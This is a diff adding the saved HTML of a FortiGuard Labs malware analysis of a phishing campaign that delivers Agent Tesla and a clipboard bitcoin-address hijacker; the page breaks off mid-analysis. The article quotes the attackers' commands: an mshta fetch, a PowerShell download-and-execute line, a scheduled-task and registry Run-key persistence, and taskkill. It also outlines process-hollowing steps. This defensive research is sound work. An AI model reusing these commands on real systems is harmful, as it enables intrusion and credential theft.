@@ -1,0 +1,1147 @@
+
+    <!DOCTYPE HTML>
+    <html lang="en" data-template="post-page teal-layer">
+    <head>
+        
+        <!--<sly data-sly-test="false">-->
+        
+            <link rel="preload" as="script" href="/etc/designs/fortinet/adb-target/at.js"/>
+            <script>
+
+                   ;(function(win, doc, style, timeout) {
+                   var STYLE_ID = 'at-body-style';
+                   function getParent() {
+                      return doc.getElementsByTagName('head')[0];
+                   }
+                   function addStyle(parent, id, def) {
+                      if (!parent) {
+                      return;
+                      }
+                      var style = doc.createElement('style');
+                      style.id = id;
+                      style.innerHTML = def;
+                      parent.appendChild(style);
+                   }
+                   function removeStyle(parent, id) {
+                      if (!parent) {
+                      return;
+                      }
+                      var style = doc.getElementById(id);
+                      if (!style) {
+                      return;
+                      }
+                      parent.removeChild(style);
+                   }
+                   addStyle(getParent(), STYLE_ID, style);
+                   setTimeout(function() {
+                      removeStyle(getParent(), STYLE_ID);
+                   }, timeout);
+                   }(window, document, "body {opacity: 0 !important}", 3000));
+                </script>
+
+            <script type="text/plain" class="optanon-category-C0003" src="/etc/designs/fortinet/adb-target/at.js"></script>
+        
+        
+    <meta charset="UTF-8"/>
+    <title>Phishing Malware Hijacks Bitcoin Addresses and Delivers New Agent Tesla Variant | FortiGuard Labs</title>
+    <meta name="keywords" content="FortiGuard Labs Threat Research,Cybersecurity Architect,FortiGuard Labs"/>
+    <meta name="description" content="FortiGuard Labs recently captured a new phishing campaign in which a MS Excel document attached to a spam email downloaded and executed several pieces of VBscript code. Used to hijack bitcoin address info, this malware delivers a new variant of Agent Tesla onto the victim’s device. Learn more."/>
+    <meta name="template" content="post-page"/>
+    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+
+<meta name="google-site-verification" content="tiQ03tSujT2TSsWJ6tNHiiUn8cwYVmdMQrGUCNrPQmo"/>
+
+<meta property="og:site_name" content="Fortinet Blog"/>
+<meta property="og:title" content="Phishing Malware Hijacks Bitcoin Addresses and Delivers New Agent Tesla Variant | FortiGuard Labs"/>
+<meta property="og:url" content="https://www.fortinet.com/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant"/>
+<meta property="og:type" content="article"/>
+<meta property="og:description" content="FortiGuard Labs recently captured a new phishing campaign in which a MS Excel document attached to a spam email downloaded and executed several pieces of VBscript code. Used to hijack bitcoin addre…"/>
+<meta property="og:image" content="https://www.fortinet.com/content/dam/fortinet-blog/article-images/fortiguard-tesla-variant-campaign-hero.png"/>
+
+<meta property="twitter:card" content="summary"/>
+<meta property="twitter:site" content="@Fortinet"/>
+
+<meta property="article:author" content="Xiaopeng Zhang "/>
+
+    <meta property="article:section" content="FortiGuard Labs Threat Research"/>
+
+
+    <meta property="article:published_time" content="2021-06-04T07:00:00.000Z"/>
+
+
+    <meta property="article:tag" content="Cybersecurity Architect"/>
+
+    <meta property="article:tag" content="FortiGuard Labs"/>
+
+
+<link rel="shortcut icon" href="/etc/designs/fortinet-blog/favicon.ico"/>
+
+<link rel="canonical" href="https://www.fortinet.com/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant"/>
+
+
+
+
+
+
+
+
+
+
+    
+<link rel="stylesheet" href="/etc.clientlibs/fortinet-blog/clientlibs/clientlib-base.min.css" type="text/css">
+
+
+
+
+
+<!-- SEO Script -->
+
+
+
+
+<!-- OneTrust Cookies Consent Notice start for fortinet.com -->
+
+
+
+    <script src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" data-document-language="true" type="text/javascript" charset="UTF-8" data-domain-script="f85f39fc-d7aa-467a-b762-fbb722748016"></script>
+    <script type="text/javascript">
+
+function OptanonWrapper() {
+    {
+       try{
+            $('#cookiescript_injected').remove(); // remove old cookie script
+        }catch(e){}
+        window.dataLayer.push({
+            event: 'OneTrustGroupsUpdated'
+        });
+        Optanon.InsertScript('//assets.adobedtm.com/launch-EN23cb8375449840dc93b13f34d935b8b9.min.js','head',null, null, '1',true);
+    }
+}
+
+</script>
+
+
+<!-- OneTrust Cookies Consent Notice end for fortinet.com -->
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+
+
+
+
+
+    </head>
+    <body>
+    
+
+
+
+    
+<div class="root responsivegrid">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="b1-header aem-GridColumn aem-GridColumn--default--12">
+
+
+<header class="b1-header__container">
+    <div class="b1-header__logo">
+        <a href="https://www.fortinet.com">
+            
+            <img class="desktop-logo" src="/content/dam/fortinet-blog/fortinet-logo-white.svg" alt="Fortinet home"/>
+            <img class="mobile-logo" src="/content/dam/fortinet-blog/fortinet-logo-white.svg" alt="Fortinet home"/>
+        </a>
+    </div>
+
+    <div class="b1-header__cta-list">
+      <a class="b1-header__cta-list-item " href="https://www.fortinet.com/blog">
+          <span>Blog</span>
+      </a>
+    </div>
+
+    <div class="b1-header__nav"><div class="b2-navigation">
+
+
+
+
+    <ul class="b2-navigation__list">
+        
+            <li class="b2-navigation-categories"><div class="b2-navigation__list-item nav-dropdown-title">Categories</div>
+                <ul class="navdropdown">
+                    
+                        <li>
+                            <a class="b2-navigation__dropdown__list-item" href="/blog/business-and-technology">
+                                <span>Business &amp; Technology </span>
+                            </a>
+                        </li>
+                    
+                
+                    
+                        <li>
+                            <a class="b2-navigation__dropdown__list-item" href="/blog/threat-research">
+                                <span>FortiGuard Labs Threat Research</span>
+                            </a>
+                        </li>
+                    
+                
+                    
+                        <li>
+                            <a class="b2-navigation__dropdown__list-item" href="/blog/industry-trends">
+                                <span>Industry Trends</span>
+                            </a>
+                        </li>
+                    
+                
+                    
+                        <li>
+                            <a class="b2-navigation__dropdown__list-item" href="/blog/partners">
+                                <span>Partners</span>
+                            </a>
+                        </li>
+                    
+                
+                    
+                        <li>
+                            <a class="b2-navigation__dropdown__list-item" href="/blog/customer-stories">
+                                <span>Customer Stories</span>
+                            </a>
+                        </li>
+                    
+                
+                    
+                        <li>
+                            <a class="b2-navigation__dropdown__list-item" href="/blog/psirt-blogs">
+                                <span>PSIRT Blogs</span>
+                            </a>
+                        </li>
+                    
+                </ul>
+            </li>
+
+        
+            <li class="m-nav-item">
+                <a class="b2-navigation__list-item false" href="/blog/business-and-technology">
+                    <span>Business &amp; Technology </span>
+                </a>
+            </li>
+        
+            <li class="m-nav-item">
+                <a class="b2-navigation__list-item false" href="/blog/threat-research">
+                    <span>FortiGuard Labs Threat Research</span>
+                </a>
+            </li>
+        
+            <li class="m-nav-item">
+                <a class="b2-navigation__list-item false" href="/blog/industry-trends">
+                    <span>Industry Trends</span>
+                </a>
+            </li>
+        
+            <li class="m-nav-item">
+                <a class="b2-navigation__list-item false" href="/blog/partners">
+                    <span>Partners</span>
+                </a>
+            </li>
+        
+            <li class="m-nav-item">
+                <a class="b2-navigation__list-item false" href="/blog/customer-stories">
+                    <span>Customer Stories</span>
+                </a>
+            </li>
+        
+            <li class="m-nav-item">
+                <a class="b2-navigation__list-item false" href="/blog/psirt-blogs">
+                    <span>PSIRT Blogs</span>
+                </a>
+            </li>
+        
+        
+        
+            <li>
+                <a class="b2-navigation__list-item false" href="/blog/ciso-collective">
+                    <span>CISO Collective</span>
+                </a>
+            </li>
+        
+    </ul>
+
+
+    
+
+</div>
+</div>
+
+    <div id="blog-site-search" class="b1-header__search" aria-expanded="false"><div class="b3-searchbox">
+
+
+<form class="b3-searchbox__form" action="/blog/search" method="get">
+    <input class="b3-searchbox__input" type="text" name="q" placeholder="Search Blogs"/>
+    <button class="b3-searchbox__icon" aria-label="Search" type="submit">
+        
+    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15.688 14.18l-4.075-4.075C12.36 9.06 12.8 7.78 12.8 6.4 12.8 2.87 9.93 0 6.4 0 2.87 0 0 2.87 0 6.4c0 3.53 2.87 6.4 6.4 6.4 1.38 0 2.66-.44 3.705-1.187l4.075 4.075c.207.208.48.312.753.312.274 0 .547-.104.755-.312.416-.417.416-1.093 0-1.51zM2.133 6.4c0-2.357 1.91-4.267 4.267-4.267s4.267 1.91 4.267 4.267-1.91 4.267-4.267 4.267S2.133 8.757 2.133 6.4z" fill="#fff">
+        </path>
+    </svg>
+
+    </button>
+</form>
+
+
+    
+
+</div>
+</div>
+
+    <button class="b1-header__search-toggle" aria-controls="blog-site-search" aria-label="Search">
+        
+    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15.688 14.18l-4.075-4.075C12.36 9.06 12.8 7.78 12.8 6.4 12.8 2.87 9.93 0 6.4 0 2.87 0 0 2.87 0 6.4c0 3.53 2.87 6.4 6.4 6.4 1.38 0 2.66-.44 3.705-1.187l4.075 4.075c.207.208.48.312.753.312.274 0 .547-.104.755-.312.416-.417.416-1.093 0-1.51zM2.133 6.4c0-2.357 1.91-4.267 4.267-4.267s4.267 1.91 4.267 4.267-1.91 4.267-4.267 4.267S2.133 8.757 2.133 6.4z">
+        </path>
+    </svg>
+
+        <div class="b1-header__search-toggle-close">
+            <span class="b1-header__search-toggle-close-line"></span>
+            <span class="b1-header__search-toggle-close-line"></span>
+        </div>
+    </button>
+
+    <div class="b1-header__nav-toggle" aria-hidden="true">
+        <span class="b1-header__nav-toggle-line"></span>
+        <span class="b1-header__nav-toggle-line"></span>
+        <span class="b1-header__nav-toggle-line"></span>
+    </div>
+</header>
+
+    
+
+</div>
+<section class="b4-hero aem-GridColumn aem-GridColumn--default--12">
+
+
+
+<div class="b4-hero__container" style="background-image:url(/content/dam/fortinet-blog/article-images/fortiguard-tesla-variant-campaign-hero.png);">
+    <img class="ratio" alt="Phishing Malware Hijacks Bitcoin Addresses and Delivers New Agent Tesla Variant | FortiGuard Labs" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
+    <div class="b4-hero__text text-container">
+        <p data-ly-test class="b4-hero__kicker">FortiGuard Labs Threat Research</p>
+        
+        
+        
+
+        <h1 class="b4-hero__headline">Phishing Malware Hijacks Bitcoin Addresses and Delivers New Agent Tesla Variant</h1>
+        
+        
+    </div>
+</div>
+</section>
+<section class="b15-blog-meta aem-GridColumn aem-GridColumn--default--12">
+
+<div class="b15-blog-meta__container text-container">
+    <span>By </span>
+
+    <span class="b15-blog-meta__author">
+
+        
+					
+
+                        
+
+                                  
+                                      
+                                            
+                                              <a href="/blog/search?author=Xiaopeng+Zhang+">Xiaopeng Zhang </a>
+                                          
+                                          
+                                           
+                                      
+                                  
+                          
+                    
+        
+    </span>
+    <span class="b15-blog-meta__">
+        
+
+              </span>
+
+
+
+    <span class="b15-blog-meta__date"> | June 04, 2021</span>
+</div>
+</section>
+<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="raw-import aem-GridColumn aem-GridColumn--default--12">
+<div class="text-container"></div>
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>FortiGuard Labs<span> recently captured a fresh phishing campaign in which a Microsoft Excel document attached to a spam email downloaded and executed several pieces of VBscript code. This </span><a href="https://www.fortinet.com/resources/cyberglossary/malware?utm_source=blog&amp;utm_campaign=malware" style="background-color: rgb(255,255,255);">malware</a><span> is used to <a href="https://www.fortinet.com/resources/cyberglossary/what-is-bitcoin-mining?utm_source=blog&amp;utm_medium=blog&amp;utm_campaign=what-is-bitcoin-mining">hijack bitcoin</a> address information and deliver a new variant of Agent Tesla onto the victim’s device. </span><br />
+<a href="https://www.fortinet.com/resources/cyberglossary/what-is-bitcoin-mining?utm_source=blog&amp;utm_medium=blog&amp;utm_campaign=what-is-bitcoin-mining"></a></p>
+<p>Agent Tesla, first discovered in late 2014, is a known spyware focused on stealing sensitive information from a victim’s device, such as saved application credentials, keyboard inputs (<a href="https://www.fortinet.com/resources/cyberglossary/what-is-keyloggers.html%20?utm_source=blog&amp;utm_campaign=keylogger">keylogger</a>), etc. We have posted a number of detailed analysis blogs for Agent Tesla campaign captured by <a href="https://www.fortinet.com/fortiguard/labs?utm_source=blog&amp;utm_campaign=fortiguard-labs">FortiGuard Labs</a> over the past several year. </p>
+<p style="margin-left: 40.0px;"><b>Affected platforms</b>:      Microsoft Windows <br />
+<b>Impacted parties</b>:         Windows Users<br />
+<b>Impact</b>:                          Sensitive Information Collection from Victim’s Device<br />
+<b>Severity level</b>:               Critical</p>
+<p>Interestingly, Agent Tesla is a commercial software that is sold online, as shown in Figure 1.1, below.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image.img.png/1652810005416/picture1.png" alt="Figure 1.1 - Agent Tesla for sale on a webpage" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 1.1 - Agent Tesla for sale on a webpage</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>On the website shown above, attackers can purchase it anonymously using the payment methods of &quot;Perfect Money&quot; or &quot;Bitcoin Payment&quot;.</p>
+<p>I conducted research on this latest phishing campaign, and in this post I will share my findings on how the campaign is started, what the Macro within the attached Microsoft Excel does and how it is executed, as well as how it performs bitcoin address hijack and delivers a new variant of Agent Tesla onto the victim’s device.<b></b></p>
+<h2>Analysis of the Excel File from the Phishing Email</h2>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_159880623.img.png/1622773954166/picture2.png" alt="Figure 2.1 – The spam email content" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 2.1 – The spam email content</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>As you may have noticed in Figure 2.1, the subject has been marked with “SPAM detected by FortiMail” to notify the customer that the email is a spam. The email asks the recipient to open the attached Microsoft Excel file to view the details of a document entitled “Order Requirements and Specs.” Once the victim opens the file in Microsoft Excel program, however, a security notice warning pops up, as shown in Figure 2.2, because the Excel document contains a Macro.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_192508012.img.png/1622773995376/picture3.png" alt="Figure 2.2 – Warning when opening the attached Excel document" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 2.2 – Warning when opening the attached Excel document</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>This is an empty Excel document, whose sheets are hidden. It also contains a password protected VBA project (Macro). I figured this out by modifying its binary data. The VBA project has a predefined method, Workbook_BeforeClose(), that is automatically called when the victim closes the document.</p>
+<p>When called, it displays two UserForms with the string “ERROR!” one by one. When the second form is closed, it executes a piece of code loaded from an OptionButton’s tag property. As you can see in Figure 2.3, it is about to execute “Shell# UserForm2.OptionButton1.Tag” (where the last &quot;_&quot; in Figure 2.3 is a kind of line-continuation character) to run the command-line command &quot;mshta hxxp://www[.]j[.]mp/ais1kdoaksodjasod14&quot;, which was loaded from the property “UserForm2.OptionButton1.Tag”.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_2094482147.img.png/1622774029741/picture3.png" alt="Figure 2.3 – Running a command loaded from a property value" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 2.3 – Running a command loaded from a property value</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>“mshta.exe” file is a software component of the Microsoft HTML Application Host, a utility responsible for executing HTA (HTML Application) files in Windows OS. An HTA file is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and scripting, such as VBScript or JScript.</p>
+<p>The URL “hxxp://www[.]j[.]mp/ais1kdoaksodjasod14” is redirected to “hxxp://bit[.]ly/ais1kdoaksodjasod14” and finally, is redirected to “hxxps://p8hj[.]blogspot[.]com/p/27.html” (“27.html”). As you may have guessed, the response from “27.html” contains malicious code, VBScript code for this case, which is encoded by the escape() function.</p>
+<p>There are three segments of VBScript code in the response from “27.html”. Figure 2.4 highlights the three segments of VBScript code that will be decoded and executed within the process “mshta.exe”. In the next section, I will demonstrate what the three segments of VBScript code do.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_1434436461.img.png/1622774074942/picture4.png" alt="Figure 2.4 – Three pieces of VBScript code in “27.html”" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 2.4 – Three pieces of VBScript code in “27.html”</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <h2>Three Segments of VBScript Code</h2>
+<p><b>1. Overview of the new Agent Tesla variant, the Auto-Run Group, and Task Scheduler</b></p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_1116103684.img.png/1622774115829/picture3.png" alt="Figure 3.1 – Un-escaped the first VBScript code" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 3.1 – Un-escaped the first VBScript code</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>After calling unescape() twice to the first segment of VBScript code, we finally obtain HTML content, as shown in figure 3.1. This content contains a piece of VBScript code that performs the three tasks shown below: </p>
+<ul>
+<li><b>Downloads PowerShell files to deliver the new Agent Tesla variant</b></li>
+</ul>
+<p style="margin-left: 40.0px;">It calls the VBScript method MicrosoftWINdows.Run() with the following parameter.</p>
+<p style="margin-left: 80.0px;">&quot;cmd /c start /min PowerShell -ex Bypass -nOp -w 1 ;i'E'x(iwr('hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-1.txt') -useB);i'E'x(iwr(' hxxps://ia601500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-2.txt') -useB);i'E'x(iwr(' hxxps://ia801500[.]us[.]archive[.]org/9/items/FTp-120-May12/27-3.txt') -useB)&quot;</p>
+<p style="margin-left: 40.0px;">It then runs PowerShell to execute three PowerShell files downloaded from three URLs. There are two EXE files stored in two huge arrays inside each downloaded PowerShell file. </p>
+<p style="margin-left: 40.0px;">The two EXE files are a loader of Agent Tesla and a new variant of Agent Tesla. Below is a segment of code extracted from “27-1.txt” as an example to explain how it loads Agent Tesla.</p>
+<p style="margin-left: 80.0px;">[Reflection.Assembly]::Load($Cli555).GetType('WpfControlLibrary1.LOGO').GetMethod('Run').Invoke($null,[object[]] ('C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe',$Cli444));</p>
+<p style="margin-left: 40.0px;">As you can see, it loads the loader from the array $Cli555, which has a function called “WpfControlLibrary1.LOGO.Run()” requiring two parameters. It runs a normal EXE file (“MSBuild.exe”), then deploys the new Agent Tesla variant stored in the huge array $Cli444 into it and executes. This means Agent Tesla will run within “MSBuild.exe”—which is also a way to protect Agent Tesla from being detected by the victim. I’ll explain the details of “WpfControlLibrary1.LOGO.Run()” later.</p>
+<ul>
+<li><b>The VBScript code adds numerous items into the Auto-Run group in the system registry</b></li>
+</ul>
+<p style="margin-left: 40.0px;">Figure 3.2 shows a screenshot of the Auto-Run group in the system registry of an infected system. It creates a WMI (Windows Management Instrumentation) Object to add into the Auto-Run group by calling its function “SetStringValue()”.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_1336630901.img.png/1622774150584/picture1.png" alt="Figure 3.2 – Auto-run group in system registry" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 3.2 – Auto-run group in system registry</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <ul>
+<li><b>Creates a scheduled task</b></li>
+</ul>
+<p style="margin-left: 40.0px;">Besides adding items into the Auto-Run group, it adds a scheduled task in “Task Scheduler” to make the entire campaign work effectively.</p>
+<p style="margin-left: 40.0px;">Below is the code used to run “schtasks” to create a new scheduled task. The new task name is “WIND0WSUPLATE”. Its action is to execute command “mshta hxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/27.html” and it’s called every 80 minutes.</p>
+<p style="margin-left: 80.0px;">MicrosoftWINdows.run &quot;schtasks /create /sc MINUTE /mo 80 /tn \&quot;WIND0WSUPLATE\&quot; /F /tr \&quot;MsHtA\&quot; \&quot;hxxp://1230948%1230948@getyournewblog[.]blogspot[.]com/p/<span style="">27.html\&quot;&quot; ,0</span></p>
+<p><b>2. Hijacking a Bitcoin address on the victim’s device</b></p>
+<p>After being decoded, we then obtained the second piece of VBScript code. Executing it saves a batch of PowerShell code into the system registry under the subkey &quot;HKCU\Software\nasdnasndnad&quot;. It also adds an item to execute this PowerShell code into the Auto-Run group in the system registry, causing it to run at system startup (refer to the item “replcia” in Figure 3.2).</p>
+<p>To do so, it executes the following code. </p>
+<p style="margin-left: 40.0px;"><i>MicrosoftWINdows.RegWrite &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\replcia&quot;, &quot;mshta vbscript:Execute(&quot;&quot;CreateObject(&quot;&quot;&quot;&quot;Wscript.Shell&quot;&quot;&quot;&quot;).Run &quot;&quot;&quot;&quot;powershell ((gp HKCU:\Software).nasdnasndnad)|IEX&quot;&quot;&quot;&quot;, 0 : window.close&quot;&quot;)&quot;, EXCELX</i></p>
+<p>Going through the PowerShell code we can see it performs a bitcoin address hijack. It does this by continually detecting the data on the system clipboard. If it’s a valid bitcoin address, it replaces the bitcoin address with attacker’s. To do so it uses a “while” statement and a function to check if a string is a valid bitcoin address. The while statement reads the system clipboard data from time to time by calling Get-Clipboard(). It then calls the function isBitcoinAddress() to determine if the data is a valid bitcoin address. If so, it then calls Set-Clipboard() to modify the bitcoin address in the clipboard to the attacker’s, which in this case is “<b>19VFGWgBkn6J3kMd8ApfCbtbNUmg8eBMvp</b>”.  Figure 3.3 shows the PowerShell code used to hijack a bitcoin address.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_1722291348.img.png/1622774244647/picture33.png" alt="Figure 3.3 – Code to hijack a Bitcoin address" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 3.3 – Code to hijack a Bitcoin address</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>Usually, people use the system clipboard to copy or paste the payee’s bitcoin address to make a payment. During this time, this bitcoin hijack will change the payee’s bitcoin address to attacker’s. The victim remains unaware that he/she paid their bitcoins to the wrong payee. <b></b></p>
+<p><b>3. Killing All Microsoft Excel and Word Processes</b></p>
+<p>The decoded code for this segment is listed below. It runs the “taskkill” command to terminate all running Microsoft Excel and Word programs. This can force kill the Excel.exe progress executing above the mshta.exe command.</p>
+<p style="margin-left: 40.0px;">&lt;script language=&quot;VBScript&quot;&gt;<br />
+CreateObject(&quot;WScript.Shell&quot;).Run &quot;taskkill /f /im Excel.exe&quot;, 0<br />
+CreateObject(&quot;WScript.Shell&quot;).Run &quot;taskkill /f /im winword.exe&quot;, 0 <br />
+window.resizeTo 0, 0<br />
+self.close<br />
+&lt;/script&gt;</p>
+<p>At this point we finished analyzing the first stage of this attack to explain what it is able to do with the three segments of VBScript. Next, I will focus on the analysis of the loader and the new Agent Tesla variant that was started by the first segment of VBScript code.</p>
+<h2>Analysis of the Loader Progress of Agent Tesla</h2>
+<p>As I mentioned earlier, “mshta.exe” runs three segments of VBScript code in 27.html. The first one dynamically loads a .Net EXE (“the loader”) from an array ($Cli555) and calls its function <i>WpfControlLibrary1.LOGO.Run()</i>to deploy the real Agent Tesla from another array onto the MSBuild.exe process.</p>
+<p>I manually extracted the loader to a local file and the Run() function is displayed in Figure 4.1 using dnSpy debugger.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
+            <img src="/blog/threat-research/phishing-malware-hijacks-bitcoin-addresses-delivers-new-agent-tesla-variant/_jcr_content/root/responsivegrid/image_1684345498.img.png/1622774285728/picture144png.png" alt="Figure 4.1 – “WpfControlLibrary1.LOGO.Run()” to load Agent Tesla" class="custom"/>
+        </noscript>
+    
+    
+    <!--<div class="enlarge-btn" data-sly-test=""><div class="gg-maximize-alt"></div> <div>Click to Enlarge</div></div>-->
+    <span class="cmp-image--title">Figure 4.1 – “WpfControlLibrary1.LOGO.Run()” to load Agent Tesla</span>
+
+
+    
+</div>
+<div class="cmp cmp-text aem-GridColumn aem-GridColumn--default--12">
+  <p>The Run() function obtains the full path of a target process ('C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe') and the binary data of the Agent Tesla variant from the second parameter. It then calls another function, PEfX2B8Tl(), to deploy this Agent Tesla variant onto the target process. As you can see in Figure 4.1, I have simplified the function for a clearer view.</p>
+<p>It first calls the API function CreateProcess() with CreateFlag 0x4 (CREATE_SUSPENDED) to create a suspended MSBuild.exe process. It then calls a bunch of familiar API functions, such as GetThreadContext(), ReadProcessMemory(), NtUnmapViewOfSection(), VirtualAllocEx(), WriteProcessMemory(), SetThreadContext(), and ResumeThread(). After that, Agent Tesla runs within the target process “MSBuild.exe”.</p>
+<p>To show you the entire picture of the malicious process that started from the phishing campaign, I have attached a screenshot of the Process Tree below, which shows all relevant processes involved in the campaign as well as the relationship between these processes.</p>
+
+
+</div>
+<div class="cmp cmp-image aem-GridColumn--default--none aem-GridColumn aem-GridColumn--default--10 aem-GridColumn--offset--default--1">
+
+    
+        <noscript data-cmp-image="{&#34;smartImages&#34;:[],&#34;smartSizes&#34;:[],&#34;lazyEnabled&#34;:true}">
+            
